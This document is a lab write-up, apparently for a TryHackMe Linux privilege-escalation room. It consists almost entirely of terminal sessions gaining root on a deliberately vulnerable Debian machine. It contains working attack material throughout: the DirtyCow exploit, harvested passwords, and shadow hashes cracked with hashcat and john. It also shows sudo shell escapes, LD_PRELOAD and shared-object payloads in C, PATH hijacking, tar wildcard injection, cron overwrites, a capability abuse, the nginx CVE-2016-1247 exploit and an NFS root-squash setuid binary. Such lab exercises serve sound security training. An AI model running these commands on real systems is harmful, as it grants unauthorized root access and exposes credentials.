# Linux Privesc Arena

##  Privilege Escalation - Kernel Exploits 

```console
TCM@debian:~$ /home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
TCM@debian:~$ gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
TCM@debian:~$ ./c0w 
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 20324000

madvise 0

ptrace 0

TCM@debian:~$ passwd 
root@debian:/home/user# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user# cp /tmp/   
backup.tar.gz  bak            useless        
root@debian:/home/user# cp /tmp/bak /usr/bin/passwd 
root@debian:/home/user# exit
TCM@debian:~$
```

## Privilege Escalation - Stored Passwords (Config Files) 

```console
TCM@debian:~$ cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321
TCM@debian:~$
```

## Privilege Escalation - Stored Passwords (History) 

```console
TCM@debian:~$ cat ~/.bash_history | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
```

## Privilege Escalation - Weak File Permissions 

```console
TCM@debian:~$ ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
M@debian:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/bin/false
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
TCM@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
```

```console
root@kali:~/thm/linux-privesc-arena# cat unshadowed.txt 
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:!:101:103::/var/spool/exim4:/bin/false
sshd:*:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:*:103:65534::/var/lib/nfs:/bin/false
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash
root@kali:~/thm/linux-privesc-arena# hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -O
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 13866/13930 MB (4096 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashfile 'unshadowed.txt' on line 2 (daemon:*:1:1:daemon:/usr/sbin:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 3 (bin:*:2:2:bin:/bin:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 4 (sys:*:3:3:sys:/dev:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 5 (sync:*:4:65534:sync:/bin:/bin/sync): Token length exception
Hashfile 'unshadowed.txt' on line 6 (games:*:5:60:games:/usr/games:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 7 (man:*:6:12:man:/var/cache/man:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 8 (lp:*:7:7:lp:/var/spool/lpd:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 9 (mail:*:8:8:mail:/var/mail:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 10 (news:*:9:9:news:/var/spool/news:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 11 (uucp:*...:10:uucp:/var/spool/uucp:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 12 (proxy:*:13:13:proxy:/bin:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 13 (www-da...:33:33:www-data:/var/www:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 14 (backup...4:34:backup:/var/backups:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 15 (list:*...g List Manager:/var/list:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 16 (irc:*:39:39:ircd:/var/run/ircd:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 17 (gnats:...m (admin):/var/lib/gnats:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 18 (nobody...5534:nobody:/nonexistent:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 19 (libuui...00:101::/var/lib/libuuid:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 20 (Debian...103::/var/spool/exim4:/bin/false): Token length exception
Hashfile 'unshadowed.txt' on line 21 (sshd:*...:/var/run/sshd:/usr/sbin/nologin): Token length exception
Hashfile 'unshadowed.txt' on line 22 (statd:...3:65534::/var/lib/nfs:/bin/false): Token length exception
Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Uses-64-Bit

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 67 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
```

## Privilege Escalation - SSH Keys

```console
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
```

## Privilege Escalation - Sudo (Shell Escaping)

```console
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo find /bin -name nano -exec /bin/sh \;
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
TCM@debian:~$ sudo awk 'BEGIN {system("/bin/sh")}'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
TCM@debian:~$ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse

Starting Nmap 5.00 ( http://nmap.org ) at 2021-06-05 12:44 EDT
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)

TCM@debian:~$ sudo vim -c '!sh'

sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
```

## Privilege Escalation - Sudo (Abusing Intended Functionality)

```console
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

```console
root@kali:~/thm/linux-privesc-arena# cat > hash.txt 
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
^C
root@kali:~/thm/linux-privesc-arena# john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
No password hashes left to crack (see FAQ)
root@kali:~/thm/linux-privesc-arena# john -show hash.txt 
root:password123:17298:0:99999:7:::

1 password hash cracked, 0 left
```

## Privilege Escalation - Sudo (LD_PRELOAD)

```console
TCM@debian:~$ cat > x.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
^C
M@debian:~$ sudo LD_PRELOAD=/tmp/x.so apache2
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

## Privilege Escalation - SUID (Shared Object Injection)

```console
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun  5 12:23 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
TCM@debian:~/.config$ cat > libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
^C
TCM@debian:~/.config$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
TCM@debian:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

## Privilege Escalation - SUID (Symlinks)

```console
TCM@debian:~/.config$ dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
root@debian:/home/user/.config# invoke-rc.d nginx rotate >/dev/null 2>&1
root@debian:/home/user/.config# su -l www-data
www-data@debian:~$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) 
nginxed-root.sh (ver. 1.0)

Discovered and coded by: 

Dawid Golunski 
https://legalhackers.com 

[+] Starting the exploit as: 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 www-data www-data 926536 Jun  5 13:16 /tmp/nginxrootsh

[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: 
lrwxrwxrwx 1 www-data www-data 18 Jun  5 13:16 /var/log/nginx/error.log -> /etc/ld.so.preload

[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
```

## Privilege Escalation - SUID (Environment Variables #1)

```console
TCM@debian:~/.config$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
TCM@debian:~/.config$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
TCM@debian:~/.config$ gcc /tmp/service.c -o /tmp/service
TCM@debian:~/.config$ export PATH=/tmp:$PATH
TCM@debian:~/.config$ /usr/local/bin/suid-env
root@debian:~/.config# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

##  Privilege Escalation - SUID (Environment Variables #2) 

```console
TCM@debian:~/.config$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

### Exploitation Method 1

```console
TCM@debian:~/.config$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
TCM@debian:~/.config$ export -f /usr/sbin/service
TCM@debian:~/.config$  /usr/local/bin/suid-env2
bash-4.1# id
uid=0(root) gid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

### Exploitation Method 2

```console
CM@debian:~/.config$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
cp: cannot create regular file `/tmp/bash': Permission denied
/usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1706) already running
.
cp: cannot create regular file `/tmp/bash': Permission denied
set +x
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

## Privilege Escalation - Capabilities

```console
TCM@debian:~/.config$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep
TCM@debian:~/.config$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~/.config# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

## Privilege Escalation - Cron (Path)

```console
TCM@debian:~/.config$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
TCM@debian:~/.config$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
TCM@debian:~/.config$ chmod +x /home/user/overwrite.sh
TCM@debian:~/.config$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

## Privilege Escalation - Cron (Wildcards)

```console
TCM@debian:~/.config$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
TCM@debian:~/.config$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
TCM@debian:~/.config$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
TCM@debian:~/.config$ touch /home/user/--checkpoint=1
TCM@debian:~/.config$ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
TCM@debian:~/.config$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

## Privilege Escalation - Cron (File Overwrite)

```console
TCM@debian:~/.config$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
TCM@debian:~/.config$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
TCM@debian:~/.config$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
TCM@debian:~/.config$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

##  Privilege Escalation - NFS Root Squashing

From Kali:

```bash
$ showmount -e 10.10.56.215
$ mkdir /tmp/1
$ mount -o rw,vers=2 10.10.56.215:/tmp /tmp/1
$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
$ gcc /tmp/1/x.c -o /tmp/1/x
$ chmod +s /tmp/1/x
```

From target:

```console
TCM@debian:~/.config$ /tmp/x 
root@debian:~/.config# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```